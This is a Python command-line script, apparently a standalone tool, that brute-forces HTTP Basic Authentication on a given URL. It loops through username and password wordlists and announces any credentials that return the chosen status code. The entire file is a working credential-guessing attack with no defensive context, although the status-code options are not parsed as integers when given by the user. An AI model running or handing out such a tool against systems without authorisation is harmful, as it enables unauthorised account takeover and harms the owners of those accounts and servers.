import argparse 
import itertools
import requests
from requests.auth import HTTPBasicAuth

BUFFER_SIZE = 1024

def error_handling(args):
    if args.pass_wordlist == None and args.password == None:
        raise Exception("Please specify a password or a password wordlist")
    elif args.user_wordlist == None and args.user == None:
        raise Exception("Please specify a username or a username wordlist")

def make_request(args, user, password):
    auth = HTTPBasicAuth(user, password)
    result = requests.get(args.link, auth=auth)

    if args.verbose:
        print(f"Trying: {user}, {password} - Status code: {result.status_code}")
    if args.non_code != None:
        if result.status_code == args.non_code:
            return False
        else:
            return True
    else:
        if result.status_code == args.code:
            return True
        else:
            return False

def buffer_r(file, buff_s=1024):
    while 1:
        buff = list(itertools.islice(file, buff_s))
        if not buff:
            break
        yield buff

def load_users(args):
    if args.user == None and args.user_wordlist != None:
        with open(args.user_wordlist, "r") as file:
            for chunk in buffer_r(file, BUFFER_SIZE):
                yield [user.strip() for user in chunk]
    else:
        yield [args.user]

def load_passwords(args):
    if args.password == None and args.pass_wordlist != None:
        with open(args.pass_wordlist, "r") as file:
            for chunk in buffer_r(file, BUFFER_SIZE):
                yield [password.strip() for password in chunk]
    else:
        yield [args.password]

def main(args):   
    print("Starting Brute Force Attack")
    
    for users in load_users(args):
        for passwords in load_passwords(args):
            for user in users:
                for password in passwords:
                    if make_request(args, user, password):
                        print(f"Success: Found valid credentials! Username: {user}, Password: {password}")
                        return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog='HTTP-auth-BF',
        description='HTTP Basic Authentication Brute Force',
        epilog='Gabriel Lepinay - Feb 2025'
    )
    parser.add_argument('-l', '--link', help='Link to attack', required=True)
    parser.add_argument('-p', '--password', help='Specify the password')
    parser.add_argument('-u', '--user', help='Specify the username')
    parser.add_argument('-P', '--pass-wordlist', help='Worlist to use for the password')
    parser.add_argument('-U', '--user-wordlist', help='Worlist to use for the username')
    parser.add_argument('-c', '--code', help='Return code to consider as a success try', default=200)
    parser.add_argument('-n', '--non-code', help='Return code to consider as a failure try')
    parser.add_argument('-v', '--verbose', help='Verbose mode', action='store_true')
    args = parser.parse_args()

    try:
        error_handling(args)
        main(args)
    except Exception as e:
        print("Error:", e, "\nUse -h for help")
        exit(1)